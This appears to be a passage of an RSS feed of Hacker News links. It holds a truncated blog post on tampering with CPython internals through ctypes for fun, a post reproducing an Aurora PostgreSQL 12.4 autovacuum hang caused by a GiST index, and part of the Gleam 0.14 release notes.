<span id="L4">4 </span>    <span>struct</span> _typeobject *ob_type;
<span id="L5">5 </span>} PyObject;
</pre>
</div>

<p>(The first bit here, <code>_PyObject_HEAD_EXTRA</code>, is only valid when compiling Python
with a special tracing debugging feature, so don't worry about it.)</p>
<p>We have the reference count <code>ob_refcnt</code>, which is used for memory management
and tells us how many other objects are referencing this one. When the
reference count of an object is zero, its memory and resources can be freed by
the garbage collector.</p>
<p>We also have the type information, <code>ob_type</code>, which tells us how to interact
with the object, what its behaviour is, what data it contains.</p>
<p>Going back to the data model:</p>
<blockquote>
<p>Every object has an identity, a type and a value. An object‚Äôs identity never
changes once it has been created; you may think of it as the object‚Äôs address
in memory. The ‚Äòis‚Äô operator compares the identity of two objects; the id()
function returns an integer representing its identity.</p>
<p>CPython implementation detail: For CPython, id(x) is the memory address where
x is stored.</p>
</blockquote>
<p>So what I'd expect CPython to do is dynamically allocate memory for a new
<code>PyObject</code> each time we create a new object.</p>
<p>Let's test this out with some integers:</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span>&gt;&gt;&gt; x = <span>500</span>
<span id="L2">2 </span>&gt;&gt;&gt; y = <span>500</span>
<span id="L3">3 </span>&gt;&gt;&gt; x <span>is</span> y
<span id="L4">4 </span><span>False</span>
</pre>
</div>

<p>That makes sense: a new <code>PyObject</code> has been allocated for each variable we've
made here, and so they are at different places in memory. But what if we use
smaller integers?</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span>&gt;&gt;&gt; x = <span>5</span>
<span id="L2">2 </span>&gt;&gt;&gt; y = <span>5</span>
<span id="L3">3 </span>&gt;&gt;&gt; x <span>is</span> y
<span id="L4">4 </span><span>True</span>
</pre>
</div>

<p>How surprising! Let's have a look in the <a href="https://github.com/python/cpython/blob/10e5c66789a06dc9015a24968e96e77a75725a7a/Objects/longobject.c#L38">CPython
source</a>
to see why this might be:</p>

<div>
<pre id="vimCodeElement"><span id="L1"> 1 </span><span>#ifndef NSMALLPOSINTS</span>
<span id="L2"> 2 </span><span>#define NSMALLPOSINTS           </span><span>257</span>
<span id="L3"> 3 </span><span>#endif</span>
<span id="L4"> 4 </span><span>#ifndef NSMALLNEGINTS</span>
<span id="L5"> 5 </span><span>#define NSMALLNEGINTS           </span><span>5</span>
<span id="L6"> 6 </span><span>#endif</span>
<span id="L7"> 7 </span>
<span id="L8"> 8 </span>
<span id="L9"> 9 </span>
<span id="L10">10 </span>
<span id="L11">11 </span>
<span id="L12">12 </span>
<span id="L13">13 </span><span>static</span> PyLongObject small_ints[NSMALLNEGINTS + NSMALLPOSINTS];
</pre>
</div>

<p>So it seems integers between -5 and 256 inclusive are statically allocated in a
big old array!  This is an optimisation that CPython has chosen to do -- the
idea is that these integers are going to be used a lot, and it would be time
consuming to allocate new memory every time.</p>
<p>But...if that means some integers have a defined place in memory, can
we...corrupt that memory?</p>
<h2>import ctypes</h2>
<p><img alt="ctypes" src="https://mcla.ug/blog/images/goosebumpsctypes.jpg" title="Someone whispering 'import ctypes' and goosebumps appearing on the arm of the listener"></p>
<p>Most good CPython shenanigans begins with importing ctypes, which is Python's
standard C foreign function interface. An FFI allows different languages to
interoperate. ctypes provides C compatible data types and allows calling
functions from shared libraries and such.</p>
<p>The ctypes docs tell us about the function
<a href="https://docs.python.org/3.7/library/ctypes.html#ctypes.memmove"><code>memmove</code></a>:</p>
<blockquote>
<p>ctypes.memmove(dst, src, count)</p>
<p>Same as the standard C memmove library function: copies count bytes from
   src to dst. dst and src must be integers or ctypes instances that can be
   converted to pointers.</p>
</blockquote>
<p>So what if we copied the memory where 6 is to where 5 is?</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span>&gt;&gt;&gt; <span>import</span> ctypes
<span id="L2">2 </span>&gt;&gt;&gt; <span>import</span> sys
<span id="L3">3 </span>&gt;&gt;&gt; ctypes.memmove(<span>id</span>(<span>5</span>), <span>id</span>(<span>6</span>), sys.getsizeof(<span>5</span>))
<span id="L4">4 </span>&gt;&gt;&gt; <span>5</span> + <span>5</span>
<span id="L5">5 </span><span>12</span>
</pre>
</div>

<p>What fun! But this is small fry stuff. We can do more. We have ambition.</p>
<h2>Ambition</h2>
<p>I don't what to change one integer. I want to change ALL the integers.</p>
<p>What if we changed what happens when you add integers together? What if we made
it subtract instead?</p>
<p><img alt="mischief" src="https://mcla.ug/blog/images/thearm.gif" title="The Arm from Twin Peaks rubbing his hands together mischeviously"></p>
<p>The way operator resolution works in Python is that the corresponding "magic
method" or "dunder method" (for double underscores) is called. For example <code>x +
y</code> will become <code>x.__add__(y)</code>. So the <code>int.__add__</code> method is going to be our
target for mischevious hackage.</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span><span>def</span> <span>fake_add</span>(x, y):
<span id="L2">2 </span>    <span>return</span> x - y
<span id="L3">3 </span>&gt;&gt;&gt; <span>int</span>.__add__ = fake_add
<span id="L4">4 </span><span>TypeError</span>: can't set attributes of built-in/extension type <span>'</span><span>int</span><span>'</span>
</pre>
</div>

<p>Annoying, but unsurprising. Python is permissive in the sense that it doesn't
have access modifiers like C++ or Java ‚Äì you can't really define private
attributes of a class. But you can't do just anything, and patching built-ins like
this is one of the things Python prevents us from doing ‚Äì unless we try very
hard.</p>
<p>So what can we try instead?  All attribute resolution comes down to looking up
attribute names in an object's dictionary. For example, <code>x.y</code> would resolve to
<code>x.__dict__["y"]</code><sup id="fnref:1"><a href="#fn:1">1</a></sup>. What if we try accessing <code>int.__add__</code> that way?</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span>&gt;&gt;&gt; <span>int</span>.__dict__[<span>"</span><span>__add__</span><span>"</span>] = fake_add
<span id="L2">2 </span><span>TypeError</span>: <span>'</span><span>mappingproxy</span><span>'</span> <span>object</span> does <span>not</span> support item assignment
</pre>
</div>

<p>Tarnation. But of course, we knew it would not be as easy as this. Perhaps lesser
programmers would give up here. "It's not allowed," they might say. But we are
strong and we are determined.</p>
<p>What is this
<a href="https://docs.python.org/3/library/types.html#types.MappingProxyType">mappingproxy</a> the interpreter speaks of?</p>
<blockquote>
<p>Read-only proxy of a mapping.</p>
</blockquote>
<p>Ok, so this is just some cast over the actual dictionary. If we can cast it to
a dictionary, we can assign to it. But doing this with a Python cast is just
creating a copy:</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span>&gt;&gt;&gt; <span>dict</span>(<span>int</span>.__dict__)[<span>"</span><span>__add__</span><span>"</span>] = fake_add
<span id="L2">2 </span>&gt;&gt;&gt; <span>1</span> + <span>5</span>
<span id="L3">3 </span><span>6</span>
<span id="L4">4 </span>&gt;&gt;&gt; (<span>1</span>).__add__(<span>5</span>)
<span id="L5">5 </span><span>6</span>
<span id="L6">6 </span>&gt;&gt;&gt; <span>int</span>.__add__ == fake_add
<span id="L7">7 </span><span>False</span>
</pre>
</div>

<p>We need to go deeper. Let's look at the <a href="https://github.com/python/cpython/blob/10e5c66789a06dc9015a24968e96e77a75725a7a/Objects/descrobject.c#L954">CPython
source</a> for the mappingproxy type.</p>

<div>
<pre id="vimCodeElement"><span id="L1"> 1 </span><span>typedef</span> <span>struct</span> {
<span id="L2"> 2 </span>    PyObject_HEAD
<span id="L3"> 3 </span>    PyObject *mapping;
<span id="L4"> 4 </span>} mappingproxyobject;
<span id="L5"> 5 </span>
<span id="L6"> 6 </span><span>static</span> PyMappingMethods mappingproxy_as_mapping = {
<span id="L7"> 7 </span>    (lenfunc)mappingproxy_len,                  
<span id="L8"> 8 </span>    (binaryfunc)mappingproxy_getitem,           
<span id="L9"> 9 </span>    <span>0</span>,                                          
<span id="L10">10 </span>};
</pre>

</div>

<p>The <code>PyMappingMethods</code> of a type tell us how it behaves as a mapping: what does
<code>x[key]</code> do (<code>mp_subscript</code>)? What does <code>x[key] = y</code> do (<code>mp_ass_subscript</code>)?</p>
<p>What this is telling us is that the mapping proxy is basically a wrapper around
a normal dictionary with the function pointer to the subscript assignment
method set to NULL.</p>
<p>We can use ctypes to cast this and reveal the underlying dictionary.</p>

<div>
<pre id="vimCodeElement"><span id="L1"> 1 </span><span>import</span> ctypes
<span id="L2"> 2 </span>
<span id="L3"> 3 </span>
<span id="L4"> 4 </span><span>class</span> <span>PyObject</span>(ctypes.Structure):
<span id="L5"> 5 </span>    <span>pass</span>
<span id="L6"> 6 </span>
<span id="L7"> 7 </span>
<span id="L8"> 8 </span>PyObject._fields_ = [
<span id="L9"> 9 </span>    (<span>'</span><span>ob_refcnt</span><span>'</span>, ctypes.c_ssize_t)
<span id="L10">10 </span>    (<span>'</span><span>ob_type</span><span>'</span>, ctypes.POINTER(PyObject))
<span id="L11">11 </span>]
<span id="L12">12 </span>
<span id="L13">13 </span>
<span id="L14">14 </span><span>class</span> <span>MappingProxy</span>(PyObject):
<span id="L15">15 </span>    _fields_ = [(<span>'</span><span>dict</span><span>'</span>, ctypes.POINTER(PyObject))]
</pre>
</div>

<p>The trouble is, once we have the dict as a PyObject pointer, how do we get it
back to being a plain old Python dict?  It's no good doing this:</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span>&gt;&gt;&gt; MappingProxy.from_address(<span>id</span>(<span>int</span>.__dict__)).dict
<span id="L2">2 </span>&lt;LP_PyObject at <span>0x7f6e98c8e7b8</span>&gt;
</pre>
</div>

<p>if we have no way to interpret this as a dict. We can use this pleasing wee
trick from the CPython API, courtesy of <a href="http://lucumr.pocoo.org/about/">Armin
Ronacher</a><sup id="fnref:2"><a href="#fn:2">2</a></sup>  which will put it as a value into another existing
dictionary where it will be interpreted the same as any other object, then we
can extract it!</p>

<div>
<pre id="vimCodeElement"><span id="L1"> 1 </span><span>def</span> <span>pyobj_cast</span>(obj):
<span id="L2"> 2 </span>    <span>return</span> ctypes.cast(<span>id</span>(obj), ctypes.POINTER(PyObject)
<span id="L3"> 3 </span>
<span id="L4"> 4 </span>
<span id="L5"> 5 </span><span>def</span> <span>get_dict</span>(proxy):
<span id="L6"> 6 </span>    dict_as_pyobj = MappingProxy.from_address(<span>id</span>(proxy)).dict
<span id="L7"> 7 </span>    fence = {}
<span id="L8"> 8 </span>    ctypes.pythonapi.PyDict_SetItem(
<span id="L9"> 9 </span>            pyobj_cast(fence),
<span id="L10">10 </span>            pyobj_cast(<span>"</span><span>victory</span><span>"</span>),
<span id="L11">11 </span>            dict_as_pyobj)
<span id="L12">12 </span>    <span>return</span> fence[<span>"</span><span>victory</span><span>"</span>]
<span id="L13">13 </span>
<span id="L14">14 </span>int_dict = get_dict(<span>int</span>.__dict__)
<span id="L15">15 </span>int_dict[<span>"</span><span>__add__</span><span>"</span>] = fake_add
</pre>
</div>

<p>Have we done it???</p>



<p>D'oh! But wait a minute...</p>



<p>What! But the data model says:</p>
<blockquote>
<p>to evaluate the expression x + y, where x is an instance of a class that has
an __add__() method, x.__add__(y) is called</p>
</blockquote>
<p>We've been lied to...this is clearly not true! It seems CPython has some
shortcut in place.</p>
<p>To be fair, they probably didn't think we'd ever find out this "lie" by
performing these shenanigans. We need to go yet deeper still to fulfill our
pointless quest. We <em>will</em> have control of the builtins.</p>
<h2>Full type mappings</h2>
<p>Back to the CPython source. What is in this type information that's in the
PyObject struct we looked at earlier? The answer: lots of stuff that I am not going to put here, but the most
interesting parts for our purposes are the <a href="https://github.com/python/cpython/blob/10e5c66789a06dc9015a24968e96e77a75725a7a/Doc/includes/typestruct.h#L16">method
suites</a>:</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span><span>typedef</span> <span>struct</span> _typeobject {
<span id="L2">2 </span>    ...
<span id="L3">3 </span>    PyNumberMethods *tp_as_number;
<span id="L4">4 </span>    PySequenceMethods *tp_as_sequence;
<span id="L5">5 </span>    PyMappingMethods *tp_as_mapping;
<span id="L6">6 </span>    ...
<span id="L7">7 </span>} PyTypeObject;
</pre>
</div>

<p>This struct contains other structs defining the behaviour of the type
via function pointers. We're specifically interested in this
<a href="https://github.com/python/cpython/blob/10e5c66789a06dc9015a24968e96e77a75725a7a/Include/cpython/object.h#L95"><code>tp_as_number</code></a>
member. Its first member, <code>nb_add</code>, is the function pointer to the add
method. This is what we want to overwrite. This is our new target.</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span><span>typedef</span> <span>struct</span> {
<span id="L2">2 </span>    binaryfunc nb_add;
<span id="L3">3 </span>    binaryfunc nb_subtract;
<span id="L4">4 </span>    binaryfunc nb_multiply;
<span id="L5">5 </span>    ...
<span id="L6">6 </span>} PyNumberMethods;
</pre>
</div>

<p>So, like we ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mcla.ug/blog/cpython-hackage.html">https://mcla.ug/blog/cpython-hackage.html</a></em></p>]]>
            </description>
            <link>https://mcla.ug/blog/cpython-hackage.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185831</guid>
            <pubDate>Thu, 18 Feb 2021 21:26:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Bug on Aurora PostgreSQL 12 causes Autovacuum to hang forever]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26185711">thread link</a>) | @fdr
<br/>
February 18, 2021 | https://www.migops.com/blog/2021/02/15/a-bug-on-aurora-postgresql-12-causes-autovacuum-to-hang-forever/ | <a href="https://web.archive.org/web/*/https://www.migops.com/blog/2021/02/15/a-bug-on-aurora-postgresql-12-causes-autovacuum-to-hang-forever/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1107" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		<p><span>Amazon recently announced the release of <span><a href="https://aws.amazon.com/about-aws/whats-new/2021/01/amazon-aurora-supports-postgresql-12/">Aurora PostgreSQL 12</a></span>. This announcement may have encouraged several customers to upgrade from their existing Aurora PostgreSQL 10.x or 11.x to Aurora PostgreSQL 12.4. The Community PostgreSQL 12 has been one of the greatest releases ever with a big list of features and performance optimizations. So, it </span><b>may be</b><span> fair to assume that Aurora PostgreSQL 12.4 works on the same lines.</span></p>
<p><span>One of the customers as well upgraded their Aurora PostgreSQL 11.9 environments to Aurora PostgreSQL 12.4. Indeed, testing always plays a key role before performing any upgrades. Similarly, the functional testing was done and everything seemed to be perfect.&nbsp;</span></p>
<p><span>The actual issue started in less than a day after the upgrade. The performance of some queries started degrading. After taking a deeper look, it was noticed that the queries on just one of the tables started behaving badly. We then saw a very strange behaviour on Performance Insights similar to the following image. I have reproduced the same issue on Aurora PostgreSQL 12 and the following is an image from my test scenario.</span></p>
<p><img loading="lazy" src="https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM.png" alt="" width="2660" height="1310" srcset="https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM.png 2660w, https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM-300x148.png 300w, https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM-1024x504.png 1024w, https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM-768x378.png 768w, https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM-1536x756.png 1536w, https://www.migops.com/blog/wp-content/uploads/2021/02/Screen-Shot-2021-02-15-at-12.03.25-PM-2048x1009.png 2048w" sizes="(max-width: 2660px) 100vw, 2660px"></p>
<p><span>What is wrong with the above image ? Yes, the vacuum process on one of the tables is running forever. To know more about autovacuum and why it is needed, I would recommend you to visit </span><span><a href="https://www.percona.com/blog/2018/08/06/basic-understanding-bloat-vacuum-postgresql-mvcc/"><span>this blog post</span></a></span><span> I have contributed to, while working for </span><span><a href="https://www.percona.com/blog/"><span>Percona</span></a></span><span>.&nbsp;</span></p>
<p><span>The size of the table (fairly small) and a completely inactive database with perfectly tuned autovacuum settings should not make the vacuum process to run forever. To know the internals of autovacuum settings and how to tune it well, I would recommend read to see </span><span><a href="https://www.percona.com/blog/2018/08/10/tuning-autovacuum-in-postgresql-and-autovacuum-internals/"><span>this blog post</span></a></span><span> I wrote sometime ago.&nbsp;</span></p>
<p><span>Following is the test case I have quickly created to reproduce this issue. I have created a table and created a GiST Index on one of the columns and then performed some inserts and updates in random.</span></p>
<pre>migops=&gt; CREATE TABLE foo.bar (id int PRIMARY KEY, sometext varchar(10), loc point);
CREATE TABLE
migops=&gt; CREATE INDEX gist_bar_idx ON foo.bar USING GIST (loc);
CREATE INDEX
migops=&gt; \d+ foo.bar
Table "foo.bar"
Column | Type | Collation | Nullable | Default | Storage | Stats target | Description 
----------+-----------------------+-----------+----------+---------+----------+--------------+-------------
id | integer | | not null | | plain | | 
sometext | character varying(10) | | | | extended | | 
loc | point | | | | plain | | 
Indexes:
"bar_pkey" PRIMARY KEY, btree (id)
"gist_bar_idx" gist (loc)
Access method: heap

migops=&gt; INSERT INTO foo.bar VALUES (generate_series(1,100000),'migops',point '(1,2)');
INSERT 0 100000
migops=&gt; UPDATE foo.bar SET sometext = 'junk' where id between 1000 and 100000;
UPDATE 99001</pre>
<p><span>Now, let me run a VACUUM on the table and check if it‚Äôs completing successfully. </span></p>
<pre>migops=&gt; VACUUM VERBOSE foo.bar ;
INFO: vacuuming "foo.bar"
INFO: index "bar_pkey" now contains 100000 row versions in 276 pages
DETAIL: 0 index row versions were removed.
0 index pages have been deleted, 0 are currently reusable.
CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s.
INFO: index "gist_bar_idx" now contains 100000 row versions in 1074 pages
DETAIL: 0 index row versions were removed.
0 index pages have been deleted, 0 are currently reusable.
CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s.
INFO: "bar": found 0 removable, 100000 nonremovable row versions in 736 out of 736 pages
DETAIL: 0 dead row versions cannot be removed yet, oldest xmin: 27251
There were 0 unused item identifiers.
Skipped 0 pages due to buffer pins, 0 frozen pages.
0 pages are entirely empty.
CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s.
VACUUM</pre>
<p><span>Yes, the above log says that the VACUUM successfully completed. However, let me insert some more data and see if VACUUM succeeds. </span></p>
<pre>migops=&gt; INSERT INTO foo.bar VALUES (generate_series(100001,1000000),'migops',point '(1,2)');
INSERT 0 900000

migops=&gt; VACUUM VERBOSE foo.bar;
INFO: vacuuming "foo.bar"
^CCancel request sent
ERROR: canceling statement due to user request
Time: 382984.688 ms (06:22.985)</pre>
<p><span>As you rightly noticed in the above logs, the VACUUM runs forever.&nbsp;</span></p>
<p><span>For a customer who runs mission critical databases, time is money. The first thought when this happened right after a Production database got upgraded was if the GiST Index got corrupted during the upgrade.&nbsp; So, the Index was rebuilt using REINDEX INDEX CONCURRENTLY. Similarly, I have rebuilt the Index in my test setup too. </span></p>
<pre>migops=&gt; REINDEX INDEX CONCURRENTLY foo.gist_bar_idx;
REINDEX
Time: 7900.757 ms (00:07.901)

migops=&gt; VACUUM VERBOSE foo.bar;
INFO: vacuuming "foo.bar"
INFO: index "gist_bar_idx" now contains 3853520 row versions in 12038 pages
DETAIL: 0 index row versions were removed.
0 index pages have been deleted, 0 are currently reusable.
CPU: user: 0.01 s, system: 0.00 s, elapsed: 0.01 s.
INFO: "bar": found 0 removable, 128 nonremovable row versions in 1 out of 7353 pages
DETAIL: 0 dead row versions cannot be removed yet, oldest xmin: 33309
There were 0 unused item identifiers.
Skipped 0 pages due to buffer pins, 0 frozen pages.
0 pages are entirely empty.
CPU: user: 0.01 s, system: 0.00 s, elapsed: 0.01 s.
VACUUM
Time: 53.344 ms</pre>
<p><span>As noticed in the above logs, upon rebuild of the Index, the VACUUM succeeded. Some relief for the customer running their Production clusters on Aurora PostgreSQL 12.4 that the VACUUM succeeded now.&nbsp;</span></p>
<p><span>But, what about the next autovacuum ? Wait, is it stuck again ? This is what the following logs tell us. While reproducing the issue, I ran some inserts.</span></p>
<pre>migops=&gt; INSERT INTO foo.bar VALUES (generate_series(10000002,11000000), 'migops', point '(3,4)');
INSERT 0 999999

-- The following ran for more than 30 mins before me terminating it. 
migops=&gt; VACUUM VERBOSE foo.bar ;
INFO: vacuuming "foo.bar"
^CCancel request sent
ERROR: canceling statement due to user request</pre>
<p><span>So, it again requires a REINDEX of the GiST Index to let the vacuum succeed again.&nbsp;</span></p>
<p><span><strong>Conclusion :</strong> We will now need to wait and see if AWS sends any notification or a public announcement to let everybody know about this issue or maybe remove the Aurora PostgreSQL 12.4 version from the list of options to implement a fix, just like </span><span><a href="https://www.theregister.com/2020/09/16/aws_aurora_postgresql_versions_disappeared/"><span>it happened earlier</span></a></span><span>.&nbsp;Please subscribe to our blog posts to follow our latest updates on migrations to postgres. Please&nbsp;<span><a href="https://www.migops.com/contact-us/">contact us</a></span>&nbsp;to know how we can assist you while performing migrations to PostgreSQL.&nbsp;</span></p>

  <!-- .wpforms-container -->
		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article></div>]]>
            </description>
            <link>https://www.migops.com/blog/2021/02/15/a-bug-on-aurora-postgresql-12-causes-autovacuum-to-hang-forever/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185711</guid>
            <pubDate>Thu, 18 Feb 2021 21:18:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gleam 0.14 ‚Äì Type-safe language for the Erlang VM]]>
            </title>
            <description>
<![CDATA[
Score 275 | Comments 48 (<a href="https://news.ycombinator.com/item?id=26185690">thread link</a>) | @lpil
<br/>
February 18, 2021 | https://gleam.run/news/gleam-v0.14-released/ | <a href="https://web.archive.org/web/*/https://gleam.run/news/gleam-v0.14-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <div>
<p>Hot on the heels of Gleam v0.13 comes another release, <a href="https://github.com/gleam-lang/gleam/releases/tag/v0.14.0">Gleam v0.14</a>!
As always, let‚Äôs take a look at some of the highlights.</p>

<h2 id="dialyzer--erlang-typespecs">Dialyzer &amp; Erlang typespecs</h2>

<p>Many dynamically typed BEAM languages support Erlang‚Äôs typespecs, type
annotations that can be analysed with the <a href="https://erlang.org/doc/man/dialyzer.html">Dialyzer</a> tool. While
not as powerful or reliable as Gleam‚Äôs type system it can be a useful tool
for finding problems with your Erlang or Elixir code. Dialyzer doesn‚Äôt
require typespecs but it can work better if they are added to the code.</p>

<p>Starting with this release Gleam will generate typespecs for all functions
and Erlang type definitions for all declared types within a Gleam program,
giving you one extra tool to help you write robust and reliable code when
using Gleam alongside Elixir or Erlang.</p>

<p>For a quick example, here‚Äôs some code in Gleam:</p>

<div><div><pre><code><span>pub</span> <span>type</span> <span>LinkedList</span><span>(</span><span>element</span><span>)</span> <span>{</span>
  <span>Empty</span>
  <span>Node</span><span>(</span><span>element</span><span>,</span> <span>LinkedList</span><span>(</span><span>element</span><span>))</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_empty</span><span>(</span><span>list</span><span>)</span> <span>{</span>
  <span>list</span> <span>==</span> <span>Empty</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>map</span><span>(</span><span>list</span><span>,</span> <span>fun</span><span>)</span> <span>{</span>
  <span>case</span> <span>list</span> <span>{</span>
    <span>Empty</span> <span>-&gt;</span> <span>Empty</span>
    <span>Node</span><span>(</span><span>i</span><span>,</span> <span>list</span><span>)</span> <span>-&gt;</span> <span>Node</span><span>(</span><span>fun</span><span>(</span><span>i</span><span>),</span> <span>map</span><span>(</span><span>list</span><span>,</span> <span>fun</span><span>))</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>And here‚Äôs the Erlang code and typespecs it compiles to:</p>

<div><div><pre><code><span>-</span><span>module</span><span>(</span><span>linked_list</span><span>).</span>
<span>-</span><span>compile</span><span>(</span><span>no_auto_import</span><span>).</span>

<span>-</span><span>export</span><span>([</span><span>is_empty</span><span>/</span><span>1</span><span>,</span> <span>map</span><span>/</span><span>2</span><span>]).</span>
<span>-</span><span>export_type</span><span>([</span><span>linked_list</span><span>/</span><span>1</span><span>]).</span>

<span>-</span><span>type</span> <span>linked_list</span><span>(</span><span>H</span><span>)</span> <span>::</span> <span>empty</span> <span>|</span> <span>{</span><span>node</span><span>,</span> <span>H</span><span>,</span> <span>linked_list</span><span>(</span><span>H</span><span>)}.</span>

<span>-</span><span>spec</span> <span>is_empty</span><span>(</span><span>linked_list</span><span>(</span><span>any</span><span>()))</span> <span>-&gt;</span> <span>boolean</span><span>().</span>
<span>is_empty</span><span>(</span><span>List</span><span>)</span> <span>-&gt;</span>
    <span>List</span> <span>=:=</span> <span>empty</span><span>.</span>

<span>-</span><span>spec</span> <span>map</span><span>(</span><span>linked_list</span><span>(</span><span>R</span><span>),</span> <span>fun</span><span>((</span><span>R</span><span>)</span> <span>-&gt;</span> <span>U</span><span>))</span> <span>-&gt;</span> <span>linked_list</span><span>(</span><span>U</span><span>).</span>
<span>map</span><span>(</span><span>List</span><span>,</span> <span>Fun</span><span>)</span> <span>-&gt;</span>
    <span>case</span> <span>List</span> <span>of</span>
        <span>empty</span> <span>-&gt;</span>
            <span>empty</span><span>;</span>

        <span>{</span><span>node</span><span>,</span> <span>I</span><span>,</span> <span>List</span><span>@</span><span>1</span><span>}</span> <span>-&gt;</span>
            <span>{</span><span>node</span><span>,</span> <span>Fun</span><span>(</span><span>I</span><span>),</span> <span>map</span><span>(</span><span>List</span><span>@</span><span>1</span><span>,</span> <span>Fun</span><span>)}</span>
    <span>end</span><span>.</span>
</code></pre></div></div>

<p>No annotations are required at all in your Gleam code to get full typespec
coverage, Gleam‚Äôs compiler reuses the type information from its powerful type
inference algorithm to determine the correct typespecs.</p>

<p>Thank you <a href="https://gitlab.com/greggreg">Greg</a> for this brilliant new feature!</p>

<h2 id="erlang-escripts">Erlang escripts</h2>

<p>Erlang projects are unusual in that typically instead of having a <code>main</code>
function as the entrypoint of your application you define a tree of actors to
come online and process items of work while your program is running.</p>

<p>This can be a powerful way to write long-lived services that make use of the
runtime‚Äôs fault tolerance features, but it does not lend itself well to
short-lived programs such as command line scripts. It can be confusing to
newcomers from other languages too.</p>

<p>For these short lived programs Erlang <a href="https://erlang.org/doc/man/escript.html">escripts</a> are typically used.
These are lightweight Erlang programs that have a <code>main</code> function as an entrypoint.</p>

<p>To make it easier to use these from Gleam the <code>gleam new</code> command now has an
escript template that can be used to create an escript project without any
further configuration required.</p>

<div><div><pre><code>gleam new my_script <span>--template</span> escript
</code></pre></div></div>

<p>A world class developer experience is a key goal of the Gleam project.
Further tooling improvements are right around the corner!</p>

<h2 id="night-mode">Night mode</h2>

<p>Gleam has the ability to render <a href="https://hexdocs.pm/gleam_stdlib/">HTML documentation</a> 
for your code, ready to upload to Hexdocs.</p>

<p>Thanks to <a href="https://github.com/tynanbe">Tynan Beatty</a> the documentation is
looking better than ever! There‚Äôs too many improvements to list but the big
one is they now have a night mode! If you‚Äôre a night owl like me I‚Äôm sure you
will enjoy the lower contrast dark tones when doing some late evening coding.</p>

<p><img src="https://gleam.run/images/news/gleam-v0.14-released/night-mode.png" alt="A screenshot of Gleam's rendered docs showing a beautiful dark theme"></p>

<h2 id="better-errors-again">Better errors, again</h2>

<p>At the risk of sounding like a broken record Gleam‚Äôs error messages have been
improved yet again. Here‚Äôs an example of one of the improvements:</p>

<p>Before:</p>

<div><div><pre><code>error: Syntax error
    ‚îå‚îÄ /src/thing.gleam:115:18
    ‚îÇ
115 ‚îÇ pub fn overlappedBy(compare, a, b) -&gt; Bool {
    ‚îÇ                  ^^ I was not expecting this.

Expected one of: "("
</code></pre></div></div>

<p>Now:</p>

<div><div><pre><code>error: Syntax error
    ‚îå‚îÄ /src/thing.gleam:115:18
    ‚îÇ
115 ‚îÇ pub fn overlappedBy(compare, a, b) -&gt; Bool {
    ‚îÇ                  ^^ This is not a valid name.

Hint: Names start with a lowercase letter and contain a-z, 0-9, or _.
Try: overlapped_by
</code></pre></div></div>

<p>Thank you to <a href="https://github.com/samontea">Samuel Mercier</a> and <a href="https://github.com/pd-andy">Andy
Thompson</a> for these.</p>

<h2 id="static-bit-string-validation">Static bit string validation</h2>

<p>Bit string syntax is a feature that Gleam inherits from Erlang. It provides a
way to declartively and concisely construct and manipulate raw bits of data
through literals and pattern matching.</p>

<p>With this Gleam release we apply further static analysis to bit string
literals and patterns used in Gleam programs to catch invalid or incorrect
code.</p>

<p>Here‚Äôs an example of one of the errors that may be reported:</p>

<div><div><pre><code>error: Syntax error
  ‚îå‚îÄ /Users/a/parser_test/src/a.gleam:2:20
  ‚îÇ
2 ‚îÇ   &lt;&lt;1:size(1)-unit(0)&gt;&gt;
  ‚îÇ                    ^ This is not a valid BitString unit value.

Hint: unit must be an integer literal &gt;= 1 and &lt;= 256
See: https://gleam.run/book/tour/bit-strings
</code></pre></div></div>

<p>Thank you <a href="https://gitlab.com/greggreg">Greg</a> for this bit string safety net.</p>

<h2 id="docker-images">Docker images</h2>

<p>Up until now <a href="https://github.com/CrowdHailer">Peter Saxton</a> has been very kindly
building Gleam docker images for use in <a href="https://sendmemo.app/">Memo</a> and the
wider community.</p>

<p>With this release he has ported his build automation over to the Gleam repo
so we have automation creation of OCI/Docker images built and published
automatically with each release.</p>

<p>We are building these variants:</p>

<ul>
  <li><code>gleam-erlang</code>: Gleam and the Erlang tooling on Ubuntu Linux</li>
  <li><code>gleam-erlang-slim</code>: Gleam and the Erlang tooling on slim Debian Linux</li>
  <li><code>gleam-erlang-alpine</code>: Gleam and the Erlang tooling on Alpine Linux</li>
  <li><code>gleam-elixir</code>: Gleam and the Elixir tooling on Ubuntu Linux</li>
